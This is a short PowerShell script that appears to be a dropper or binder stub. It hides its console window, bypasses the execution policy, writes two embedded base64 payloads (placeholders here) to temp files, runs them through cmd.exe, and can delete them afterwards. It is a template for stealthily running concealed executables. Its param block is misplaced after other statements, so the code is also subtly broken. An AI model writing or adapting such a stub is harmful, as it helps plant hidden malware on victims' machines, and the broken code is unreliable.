Add-Type -Name Win32 -Namespace Win32Functions -MemberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindow(System.IntPtr hWnd, int nCmdShow);
"@

$consolePtr = [System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle
[Win32Functions.Win32]::ShowWindow($consolePtr, 0) | Out-Null

Set-ExecutionPolicy Bypass -Scope Process -Force

param(
    [string]$file_ending1 = "YOUR_FILE_ENDING_HERE1",
    [string]$file_ending2 = "YOUR_FILE_ENDING_HERE2",
    [bool]$remove = $false
)

function Delete-TempFile {
    param (
        [string]$tempFile
    )
    try {
        Remove-Item -Path $tempFile -Force
        Write-Host "Temp file '$tempFile' deleted successfully."
    } catch {
        Write-Error "Error deleting temp file '$tempFile':"
    }
}

function Start-CmdProcess {
    param (
        [string]$tempFile,
        [array]$cmdArgs
    )

    $allArgs = @("/C", "start", $tempFile) + $cmdArgs

    $process = Start-Process -FilePath "cmd.exe" -ArgumentList $allArgs -NoNewWindow -PassThru
    return $process
}

function Main {
    $tempDir1 = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "1." + $file_ending1)
    $tempDir2 = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "2." + $file_ending2)
    $b64stuff1 = "BASE64ENCODEDSTUFFHERE1"
    $b64stuff2 = "BASE64ENCODEDSTUFFHERE2"
    $decoded1 = [System.Convert]::FromBase64String($b64stuff1)
    $decoded2 = [System.Convert]::FromBase64String($b64stuff2)

    Set-Content -Path $tempDir1 -Value $decoded1 -Encoding Byte
    Set-Content -Path $tempDir2 -Value $decoded2 -Encoding Byte

    $cmdArgs = $args

    $process1 = Start-CmdProcess -tempFile $tempDir1 -cmdArgs $cmdArgs
    $process2 = Start-CmdProcess -tempFile $tempDir2 -cmdArgs $cmdArgs

    # Monitor processes
    while ($process1.HasExited -eq $false -or $process2.HasExited -eq $false) {
        Start-Sleep -Seconds 1
        if ($remove -and $process1.HasExited) {
            Delete-TempFile -tempFile $tempDir1
        }
        if ($remove -and $process2.HasExited) {
            Delete-TempFile -tempFile $tempDir2
        }
    }
}

Main @PSBoundParameters
